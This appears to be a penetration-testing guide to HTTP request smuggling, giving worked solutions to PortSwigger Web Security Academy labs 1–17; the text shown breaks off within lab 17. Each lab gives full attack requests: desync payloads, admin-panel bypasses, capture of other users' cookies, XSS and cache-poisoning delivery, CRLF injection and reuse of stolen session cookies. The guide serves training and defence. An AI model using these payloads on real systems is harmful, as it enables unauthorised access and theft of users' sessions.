# HTTP Request Smuggling - Complete Penetration Testing Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Complete PortSwigger Lab Solutions](#complete-portswigger-lab-solutions)
3. [Attack Techniques and Methodology](#attack-techniques-and-methodology)
4. [Tools and Frameworks](#tools-and-frameworks)
5. [OWASP Guidelines](#owasp-guidelines)
6. [CVE Examples and Real-World Exploitation](#cve-examples-and-real-world-exploitation)
7. [Industry Standards](#industry-standards)
8. [Research Papers and Technical Articles](#research-papers-and-technical-articles)
9. [Secure Coding and Prevention](#secure-coding-and-prevention)
10. [References](#references)

---

## Introduction

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities arise when the front-end server and back-end server use different mechanisms for determining the boundaries between requests.

### Core Concepts

**Attack Mechanism:**
The vulnerability exploits disagreements between front-end and back-end servers about request boundaries. When these servers are chained together and interpret request delimiters differently, attackers can prepend malicious data to subsequent requests.

**Vulnerability Types:**
- **CL.TE**: Front-end uses Content-Length; back-end uses Transfer-Encoding
- **TE.CL**: Front-end uses Transfer-Encoding; back-end uses Content-Length
- **TE.TE**: Both support Transfer-Encoding, but one ignores obfuscated versions
- **H2.CL**: HTTP/2 front-end downgrades to HTTP/1.1 with Content-Length confusion
- **H2.TE**: HTTP/2 downgrading with Transfer-Encoding issues
- **CL.0**: Server ignores Content-Length header entirely

**Root Cause:**
The HTTP/1.1 specification offers two methods for specifying message length (Content-Length and Transfer-Encoding headers), creating potential conflicts when servers prioritize them differently.

---

## Complete PortSwigger Lab Solutions

### Lab Summary Table

| # | Lab Name | Difficulty | Category | Key Technique |
|---|----------|------------|----------|---------------|
| 1 | Basic CL.TE vulnerability | APPRENTICE | Basic | Content-Length vs Transfer-Encoding |
| 2 | Basic TE.CL vulnerability | APPRENTICE | Basic | Transfer-Encoding vs Content-Length |
| 3 | Obfuscating the TE header | PRACTITIONER | Basic | Header obfuscation |
| 4 | Confirming CL.TE via differential responses | PRACTITIONER | Finding | Differential response detection |
| 5 | Confirming TE.CL via differential responses | PRACTITIONER | Finding | Differential response detection |
| 6 | Bypass front-end controls, CL.TE | PRACTITIONER | Exploiting | Security control bypass |
| 7 | Bypass front-end controls, TE.CL | PRACTITIONER | Exploiting | Security control bypass |
| 8 | Reveal front-end request rewriting | PRACTITIONER | Exploiting | Header discovery |
| 9 | Capture other users' requests | PRACTITIONER | Exploiting | Session hijacking |
| 10 | Deliver reflected XSS | PRACTITIONER | Exploiting | XSS via smuggling |
| 11 | Perform web cache deception | PRACTITIONER | Exploiting | Cache poisoning |
| 12 | Perform web cache poisoning | EXPERT | Exploiting | Advanced cache poisoning |
| 13 | H2.CL request smuggling | EXPERT | HTTP/2 | HTTP/2 downgrade attack |
| 14 | HTTP/2 request splitting via CRLF | EXPERT | HTTP/2 | CRLF injection |
| 15 | Response queue poisoning via H2.TE | EXPERT | HTTP/2 | Queue desynchronization |
| 16 | Bypass access controls via HTTP/2 tunnelling | EXPERT | HTTP/2 | Request tunnelling |
| 17 | Web cache poisoning via HTTP/2 tunnelling | EXPERT | HTTP/2 | Cache poisoning |
| 18 | Client-side desync | EXPERT | Browser-Powered | Browser-based attack |
| 19 | CL.0 request smuggling | EXPERT | Browser-Powered | Content-Length zero |
| 20 | Server-side pause-based smuggling | EXPERT | Browser-Powered | Timing attack |

---

### BASIC LABS

#### Lab 1: HTTP request smuggling, basic CL.TE vulnerability

**URL:** https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

**Difficulty:** APPRENTICE

**Description:**
Front-end and back-end servers where the front-end doesn't support chunked encoding and rejects non-GET/POST methods.

**Objective:**
Smuggle a request to make the next backend request appear as method `GPOST`.

**Solution Steps:**

1. **Setup:** Use Burp Repeater and switch to HTTP/1 protocol via Inspector panel (Request attributes)

2. **Payload:** Send this request TWICE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

3. **Expected Result:** Second response shows "Unrecognized method GPOST"

**Technical Details:**
- Front-end processes Content-Length header (sees 6 bytes total)
- Back-end processes Transfer-Encoding header (sees 0-length chunk, then leftover "G")
- The "G" prepends to the next request's method, creating "GPOST"

**Burp Suite Features:**
- Burp Repeater for request manipulation
- Inspector panel for protocol switching to HTTP/1
- HTTP Request Smuggler extension (BApp Store) assists with length calculations

**Important Notes:**
- Lab supports HTTP/2 but requires HTTP/1 for solution
- Must send request twice to observe smuggling effect
- Second request receives the poisoned response

---

#### Lab 2: HTTP request smuggling, basic TE.CL vulnerability

**URL:** https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

**Difficulty:** APPRENTICE

**Description:**
Front-end and back-end servers where the back-end doesn't support chunked encoding. Front-end only accepts GET or POST methods.

**Objective:**
Smuggle a request to make the next request appear to use method `GPOST`.

**Solution Steps:**

1. **Burp Configuration:**
   - Access Burp Suite Repeater
   - Disable "Update Content-Length" option (Repeater menu)
   - Ensure HTTP/1 protocol is selected

2. **Payload:** Send this request TWICE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**CRITICAL:** Include trailing `\r\n\r\n` after the final `0`

3. **Expected Result:** Second response displays "Unrecognized method GPOST"

**Technical Details:**
- Front-end prioritizes Transfer-Encoding, processes entire chunked message
- Back-end prioritizes Content-Length, reads only 4 bytes (`5c\r\n`) and leaves rest for next request
- Causes request desynchronization

**Tools & Features:**
- Burp Suite Repeater with manual Content-Length control
- HTTP Request Smuggler Burp extension
- Protocol switching capability

**Common Mistakes:**
- Forgetting to disable automatic Content-Length updates
- Missing trailing CRLF sequences
- Not sending the request twice

---

#### Lab 3: HTTP request smuggling, obfuscating the TE header

**URL:** https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header

**Difficulty:** PRACTITIONER

**Description:**
Exploit differences in how front-end and back-end servers handle duplicate/obfuscated HTTP headers.

**Objective:**
Smuggle a request using obfuscated Transfer-Encoding header to cause next request to appear as `GPOST` method.

**Solution Steps:**

1. **Burp Configuration:**
   - Navigate to Repeater menu
   - Disable "Update Content-Length" option

2. **Payload:** Issue this request TWICE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**CRITICAL:** Include `\r\n\r\n` trailing sequence after final `0`

3. **Expected Result:** Second response displays "Unrecognized method GPOST"

**Technical Mechanics:**
- Uses duplicate `Transfer-Encoding` headers with different values
- Front-end accepts first header but is confused by `Transfer-encoding: cow`
- Back-end processes the valid `Transfer-Encoding: chunked` header
- Causes request desynchronization through header obfuscation

**Common Obfuscation Techniques:**
- Duplicate headers with typos: `Transfer-encoding` vs `Transfer-Encoding`
- Invalid values: `cow`, `identity`, `xchunked`, etc.
- Extra spaces or characters
- Mixed case variations
- Leading/trailing whitespace

**Tools & Resources:**
- Burp Extension: HTTP Request Smuggler (BApp Store)
- Protocol Note: Requires HTTP/1.1 (not HTTP/2)

---

### FINDING/CONFIRMING VULNERABILITIES

#### Lab 4: Confirming a CL.TE vulnerability via differential responses

**URL:** https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

**Difficulty:** PRACTITIONER

**Description:**
Laboratory with front-end and back-end servers where front-end lacks support for chunked encoding.

**Objective:**
Smuggle a request so a subsequent request to root path (/) receives HTTP 404 Not Found response.

**Solution Steps:**

1. **Setup:** Switch to HTTP/1 in Burp Repeater (Inspector → Request attributes)

2. **Payload:** Submit this request TWICE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

3. **Expected Result:** Second request triggers 404 response

**Technical Details:**
- Leverages Content-Length to Transfer-Encoding (CL.TE) mismatch
- Front-end uses Content-Length (35 bytes), sees entire request as one
- Back-end uses Transfer-Encoding, sees 0-chunk end, treats rest as new request
- Smuggled `/404` path causes 404 on victim's request

**Differential Response Analysis:**
This technique confirms vulnerability by observing different responses based on smuggled content:
- First request: Normal response (200 OK)
- Second request: 404 Not Found (due to smuggled path)
- Consistent differential responses confirm successful smuggling

**Burp Suite Tools:**
- Burp Repeater for crafting requests
- HTTP Request Smuggler extension (length field automation)
- Inspector panel for protocol selection

---

#### Lab 5: Confirming a TE.CL vulnerability via differential responses

**URL:** https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

**Difficulty:** PRACTITIONER

**Description:**
Front-end and back-end server architecture where the back-end server doesn't support chunked encoding.

**Objective:**
Craft a smuggled request that causes subsequent request to web root to return 404 Not Found.

**Solution Steps:**

1. **Burp Configuration:**
   - Disable "Update Content-Length" in Repeater
   - Switch to HTTP/1 protocol

2. **Payload:** Send this request TWICE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

3. **Expected Result:** Second request receives 404 response

**Technical Details:**
- TE.CL vulnerability (Transfer-Encoding vs Content-Length)
- Front-end prioritizes Transfer-Encoding (processes full chunked message)
- Back-end prioritizes Content-Length (reads only 4 bytes: `5e\r\n`), leaves rest for next request
- Creates desynchronization confirming vulnerability

**Why This Confirms Vulnerability:**
- Repeatable: Same behavior on multiple attempts
- Predictable: Known path (/404) produces expected response
- Differential: Response differs from normal behavior
- Isolated: Only affects smuggled requests

---

### EXPLOITING REQUEST SMUGGLING

#### Lab 6: Bypass front-end security controls, CL.TE vulnerability

**URL:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

**Difficulty:** PRACTITIONER

**Description:**
Front-end and back-end server architecture with admin panel at `/admin` blocked by front-end security controls. Front-end doesn't support chunked encoding.

**Objective:**
Smuggle a request to access backend admin panel and delete user `carlos`.

**Solution Steps:**

**Phase 1: Reconnaissance**
Verify `/admin` is blocked by front-end (403 Forbidden or similar)

**Phase 2: Initial Smuggling Attempt**
Send TWICE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

**Result:** Rejected - requires `Host: localhost` header

**Phase 3: Adding Host Header**
Send TWICE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

**Result:** Admin panel access achieved

**Phase 4: Delete User**
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

**Why This Works:**
- Front-end security checks use original Host header
- Back-end trusts smuggled `Host: localhost` header
- Front-end never sees the `/admin` request in its security analysis
- Back-end processes smuggled request as if it came from localhost

**Burp Suite Tools:**
- Burp Repeater
- HTTP Request Smuggler Extension
- Inspector Panel (protocol switching)

**Critical Notes:**
- Manually adjusting Content-Length is error-prone
- Precise byte counting essential (include all CRLF sequences)
- HTTP/1 required despite HTTP/2 support

---

#### Lab 7: Bypass front-end security controls, TE.CL vulnerability

**URL:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

**Difficulty:** PRACTITIONER

**Description:**
Two-server architecture where back-end doesn't support chunked encoding. Admin panel at `/admin` blocked by front-end.

**Objective:**
Smuggle request to access admin panel and delete user `carlos`.

**Solution Steps:**

**Phase 1:** Verify `/admin` blocked; disable auto-length updating in Burp

**Phase 2:** Execute smuggled request (send TWICE):
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
*Include trailing `\r\n\r\n` after final `0`*

**Phase 3:** Modify to deletion payload:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**Key Constraints:**
- HTTP/1 required
- Uncheck "Update Content-Length" in Burp Repeater
- Back-end requires `Host: localhost` for admin access

**Tools Referenced:**
- Burp Repeater
- HTTP Request Smuggler extension
- Request attributes inspector

---

#### Lab 8: Reveal front-end request rewriting

**URL:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

**Difficulty:** PRACTITIONER

**Description:**
Front-end server adds IP address information via custom header before passing requests to back-end. Admin panel at `/admin` restricts access to IP `127.0.0.1`.

**Objective:**
1. Discover the custom IP header name via request smuggling
2. Access admin panel by spoofing the IP header
3. Delete user `carlos`

**Solution Steps:**

**Phase 1: Discover the Header Name**

Send this request TWICE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

The second request's response reveals the rewritten HTTP request in the search results, exposing the custom IP header name (e.g., `X-abcdef-Ip`).

**Phase 2: Access Admin Panel**

Replace `X-abcdef-Ip` with actual discovered header name:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

**Phase 3: Delete User**
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

**Why This Works:**
- Search function reflects entire POST body including headers
- Content-Length mismatch forces back-end to append next request
- Next request's headers (including custom IP header) appear in search results
- Discovered header can be spoofed to bypass IP restrictions

**Critical Tips:**
- The search parameter's reflection is intentional for observing responses
- Manually adjusting Content-Length requires precision
- Custom IP header name varies per lab instance

---

#### Lab 9: Capture other users' requests

**URL:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

**Difficulty:** PRACTITIONER

**Description:**
Front-end and back-end servers where front-end doesn't support chunked encoding.

**Objective:**
Smuggle a request causing subsequent user requests to be stored, then retrieve victim credentials to access their account.

**Solution Steps:**

**Phase 1: Establish Baseline**
Post a comment on a blog post, send POST request to Burp Repeater

**Phase 2: Parameter Optimization**
Reorder body parameters so comment field appears last, confirm functionality persists

**Phase 3: Smuggled Request**
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Attacker&email=attacker@example.com&website=&comment=test
```

**Phase 4: Verification & Extraction**
- Review blog post comments for captured user request data
- Extract victim's Cookie header from comment
- Authenticate using stolen credentials

**Technical Details:**
- Smuggled `Content-Length: 400` exceeds actual POST body
- Back-end waits for remaining bytes
- Next user's request fills the gap
- Entire request (including cookies) stored in comment field

**Critical Troubleshooting:**

**Timing Issue:**
- Target user browses intermittently (victim simulator)
- May need to repeat attack multiple times
- Wait between attempts for victim to make request

**Incomplete Capture:**
- If Cookie header missing, incrementally increase `Content-Length`
- Too small: Only captures partial request
- Too large: Causes timeout errors
- Optimal: Captures full cookie but not entire request body

**Timeout Errors:**
- Indicates captured byte count exceeds subsequent request size
- Reduce `Content-Length` accordingly
- Balance between capturing data and avoiding timeouts

---

#### Lab 10: Deliver reflected XSS

**URL:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

**Difficulty:** PRACTITIONER

**Description:**
Front-end and back-end servers where front-end doesn't support chunked encoding. Application has reflected XSS vulnerability via User-Agent header.

**Objective:**
Craft smuggled request causing next user's request to receive response containing XSS payload executing `alert(1)`.

**Solution Steps:**

**Phase 1:** Access blog post and send to Burp Repeater. Locate comment form containing User-Agent header in hidden input field.

**Phase 2:** Test XSS vulnerability with payload:
```
"/><script>alert(1)</script>
```
Confirm it reflects in response without encoding.

**Phase 3:** Deliver attack via request smuggling:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

**How It Works:**
- User-Agent header reflected in hidden input field on blog post page
- Breaking out of input context with `"/>`
- XSS payload executes when victim receives poisoned response
- Victim's browser renders attacker-controlled JavaScript

**Important Notes:**
- Protocol: Use HTTP/1.1 (not HTTP/2)
- Timing: Victim makes intermittent requests; multiple attempts may be necessary
- Tool: HTTP Request Smuggler assists with length calculations

**Attack Chain:**
1. Attacker smuggles malicious User-Agent
2. Victim requests blog post
3. Victim receives response with smuggled User-Agent
4. Reflected XSS executes in victim's browser

---

#### Lab 11: Perform web cache deception

**URL:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception

**Difficulty:** PRACTITIONER

**Description:**
Front-end and back-end servers where front-end doesn't support chunked encoding. Front-end caches static resources without anti-caching headers.

**Objective:**
Perform request smuggling attack causing next user's request to save their API key in cache. Then retrieve victim's API key from cache.

**Solution Steps:**

**Phase 1: Reconnaissance**
- Log in with credentials `wiener:peter`
- Access account page to observe caching behavior
- Identify API key endpoint `/my-account`

**Phase 2: Smuggling Payload**
Wait 30 seconds after any previous requests, then send:
```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```

**Phase 3: Execution & Verification**
- Repeat smuggling request multiple times
- Load homepage in incognito window
- Use Burp's Search function to locate "Your API Key" in cached resources
- If unsuccessful, repeat POST requests and force-reload browser

**How It Works:**
- Zero-length chunk terminates smuggled request parsing on front-end
- Front-end forwards smuggled GET to back-end
- Victim's subsequent request to homepage appended to smuggled request
- Back-end processes: GET /my-account + (victim's GET /)
- Response containing victim's API key returned
- Front-end caches this response under homepage URL
- Attacker retrieves cached response containing victim's API key

**Critical Tips:**
- 30-second wait required before attack (cache TTL)
- Victim simulator makes periodic requests
- Timing coordination essential between smuggling and victim request
- Multiple attempts may be necessary
- Check for "Cache-Hit" headers to confirm caching

---

#### Lab 12: Perform web cache poisoning

**URL:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning

**Difficulty:** EXPERT

**Description:**
Front-end and back-end servers where front-end doesn't support chunked encoding and caches certain responses.

**Objective:**
Execute request smuggling attack to poison cache, causing subsequent requests for JavaScript file to redirect to exploit server displaying `alert(document.cookie)`.

**Solution Steps:**

**Phase 1: Initial Reconnaissance**
- Access a blog post
- Navigate to next post using "Next post" button
- Observe JavaScript import: `/resources/js/tracking.js`
- Note redirect behavior when Host header modified

**Phase 2: Exploit Server Setup**
Create JavaScript file at `/resources/js/tracking.js` path on exploit server:
```javascript
alert(document.cookie)
```

**Phase 3: Cache Poisoning Attack**
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

**Phase 4: Trigger Caching**
Request `/resources/js/tracking.js` from lab domain. If successful, receive redirect response pointing to exploit server.

**Phase 5: Verification**
Repeat tracking.js request multiple times to verify cache consistently serves poisoned response (redirect to exploit server).

**Attack Chain:**
1. Smuggle request with malicious Host header
2. Victim requests next post
3. Redirect to exploit server cached
4. All users requesting tracking.js get redirect
5. Users load malicious JavaScript from exploit server
6. XSS executes: `alert(document.cookie)`

**Technical Notes:**
- Lab supports HTTP/2 but requires HTTP/1
- Simulated victim makes periodic requests
- Multiple attack attempts may be necessary
- Cache must be primed with redirect response

---

### ADVANCED HTTP/2 LABS

#### Lab 13: H2.CL request smuggling

**URL:** https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling

**Difficulty:** EXPERT

**Description:**
Front-end server downgrades HTTP/2 requests even if they have ambiguous length, creating H2.CL vulnerability.

**Objective:**
Perform request smuggling attack causing victim's browser to load and execute malicious JavaScript from exploit server, calling `alert(document.cookie)`. Victim visits home page every 10 seconds.

**Solution Steps:**

**Phase 1: Initial Smuggling Test**
Send HTTP/2 POST with `Content-Length: 0` containing smuggled data:
```http
POST / HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
```

Expected: Every second request returns 404, confirming backend appending

**Phase 2: Redirect Exploitation**
Smuggle start of `/resources` request with arbitrary Host header:
```http
POST / HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
```

**Phase 3: Malicious Payload Delivery**
- Create `/resources` file on exploit server containing:
```javascript
alert(document.cookie)
```
- Modify Host header to point to exploit server
- Verify redirect behavior

**Phase 4: Timing and Completion**
- Wait ~10 seconds for victim browser request
- Check exploit server access logs for `GET /resources/` request
- Repeat attack multiple times for proper timing synchronization
- Lab solves when victim loads malicious JavaScript

**Critical Hints:**
- Technique involves "turning on-site redirects into open redirects"
- Timing essential—poison connection before victim's JavaScript import
- Multiple attempts required for successful execution
- HTTP/2 must be used for initial request

**Burp Suite Features:**
- Burp Repeater with HTTP/2 support
- Inspector's Request Attributes (HTTP/2 protocol selection)
- Exploit server integration

---

#### Lab 14: HTTP/2 request splitting via CRLF injection

**URL:** https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection

**Difficulty:** EXPERT

**Description:**
Front-end server downgrades HTTP/2 requests without properly sanitizing headers, allowing CRLF injection.

**Objective:**
Delete user `carlos` by leveraging response queue poisoning to access `/admin` panel. Admin authenticates ~every 10 seconds.

**Solution Steps:**

**Phase 1: Request Setup**
- Send `GET /` request to Burp Repeater
- Use Inspector to verify HTTP/2 protocol selection
- Change path to non-existent endpoint (e.g., `/x`) for consistent 404s

**Phase 2: Header Injection**
Using Inspector, add custom header with CRLF sequences:
- **Header Name:** `foo`
- **Header Value:** `bar\r\n\r\nGET /x HTTP/1.1\r\nHost: YOUR-LAB-ID.web-security-academy.net`

**Phase 3: Response Queue Poisoning**
Send crafted request. During HTTP/2 downgrading:
- Server appends `\r\n\r\n` to complete HTTP/1.1 format
- Converts smuggled content into complete HTTP request
- Poisons the response queue

**Phase 4: Capture Admin Session**
After ~5 seconds, resend request to fetch queued responses. Repeat until capturing 302 response containing admin's session cookie.

**Phase 5: Access Admin Panel**
```http
GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE
```

**Phase 6: Delete Target User**
Locate deletion endpoint (`/admin/delete?username=carlos`), update request path, and send.

**Critical Techniques:**

**Newline Injection Method:**
Inspector supports injecting `\r\n` sequences:
- Click on header to edit
- Use Shift+Return to insert newlines
- Must drill down into headers, not double-click

**Connection Reset Handling:**
Backend resets after 10 requests. If state becomes unstable:
- Send 10 normal GET requests
- Establishes fresh connection
- Retry attack sequence

**Troubleshooting:**
If multiple 200 responses without admin's 302:
- Send 10 standard requests to reset connection
- Ensure proper CRLF injection format
- Verify HTTP/2 protocol in use

---

#### Lab 15: Response queue poisoning via H2.TE request smuggling

**URL:** https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

**Difficulty:** EXPERT

**Description:**
Front-end server downgrades HTTP/2 requests containing ambiguous length indicators, enabling request smuggling attacks.

**Objective:**
Delete user `carlos` by exploiting response queue poisoning to breach admin panel at `/admin`.

**Environment:**
- Admin users log in approximately every 15 seconds
- Backend connection resets every 10 requests

**Solution Steps:**

**Phase 1: Verify Smuggling Capability**
Send HTTP/2 POST with chunked transfer encoding:
```http
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

Ensure protocol is HTTP/2 in Burp Repeater's Request Attributes. Alternating 404 responses confirm successful smuggling.

**Phase 2: Construct Complete Smuggled Request**
Create request that smuggles full HTTP/1.1 GET command:
```http
POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net


```

Non-existent `/x` endpoint ensures 404 responses, making captured admin traffic distinguishable.

**Phase 3: Poison Response Queue**
Send constructed request. Server responds with 404 for your payload.

**Phase 4: Capture Admin Session**
Wait ~5 seconds, then resend to retrieve queued responses. Repeat until receiving 302 redirect containing admin's post-login session cookie.

**Phase 5: Access Admin Panel**
```http
GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE
```

Repeat until receiving 200 response with admin interface.

**Phase 6: Delete Target User**
Locate deletion URL (`/admin/delete?username=carlos`), then execute:
```http
GET /admin/delete?username=carlos HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE
```

**Key Concepts:**
- **HTTP/2 Downgrading:** Frontend converts HTTP/2 to HTTP/1.1 for backend
- **Response Queue Desynchronization:** Smuggled requests cause misaligned responses
- **Session Hijacking:** Captured admin cookies grant unauthorized access

**Troubleshooting:**
If unable to capture 302 after multiple attempts:
- Send 10 standard requests to reset backend connection
- Restart poisoning sequence
- Verify Transfer-Encoding header present

---

#### Lab 16: Bypassing access controls via HTTP/2 request tunnelling

**URL:** https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling

**Difficulty:** EXPERT

**Description:**
Front-end server downgrades HTTP/2 to HTTP/1.1. Header names aren't adequately sanitized, allowing CRLF injection. Front-end doesn't reuse backend connections.

**Objective:**
Access admin panel at `/admin` and delete user `carlos` via HTTP/2 request tunnelling.

**Solution Steps:**

**Phase 1: Proof of Concept**
Initial exploit demonstrates CRLF injection by injecting Host header within arbitrary header name:
- **Header Name:** `foo: bar\r\nHost: abc`
- **Header Value:** `xyz`

Response shows injected Host header processed by backend.

**Phase 2: Information Leakage**
Smuggle `Content-Length: 500` header via header name injection and append padding to request body to leak client authentication headers:

**Header Name:**
```
foo: bar\r\n
Content-Length: 500\r\n
\r\n
```

Add padding to body (500+ characters of "x").

Response reveals:
```
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
X-FRONTEND-KEY: [unique-key]
```

**Phase 3: Admin Access**
Switch to `HEAD` method and inject complete HTTP/1.1 request within header name:

**Header Name:**
```
foo: bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-SSL-VERIFIED: 1\r\n
X-SSL-CLIENT-CN: administrator\r\n
X-FRONTEND-KEY: [YOUR-UNIQUE-KEY]\r\n
\r\n
```

**Phase 4: Target Deletion**
After discovering deletion endpoint (`/admin/delete?username=carlos`), update smuggled request path and resend.

**Critical Implementation:**
- Update `X-FRONTEND-KEY` with leaked unique key from your session
- Use shorter endpoints (like `/login`) when debugging due to Content-Length constraints
- Maintain proper CRLF formatting (`\r\n`) in smuggled headers
- Pad request bodies to exceed smuggled Content-Length values

**Why This Works:**
- Header name injection allows complete HTTP/1.1 request injection
- Backend processes injected request as separate request
- Authentication headers leaked reveal required values
- Spoofed headers bypass SSL client certificate checks

---

#### Lab 17: Web cache poisoning via HTTP/2 request tunnelling

**URL:** https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling

**Difficulty:** EXPERT

**Description:**
Front-end server downgrades HTTP/2 requests without consistently sanitizing headers. Front-end doesn't reuse backend connections.

**Objective:**
Poison cache so when victim visits home page every 15 seconds, their browser executes `alert(1)`.

**Solution Steps:**

**Phase 1-2:** Send `GET /` to Repeater using HTTP/2. Test header injection via `:path` pseudo-header:
- **Payload:** `/?cachebuster=1 HTTP/1.1\r\nFoo: bar`

Response shows injected `Foo` header processed.

**Phase 3:** Switch to HEAD method and tunnel request:
- **Payload:** `/?cachebuster=2 HTTP/1.1\r\nHost: YOUR-LAB-ID.web-security-academy.net\r\n\r\nGET /post?postId=1 HTTP/1.1\r\nFoo: bar`

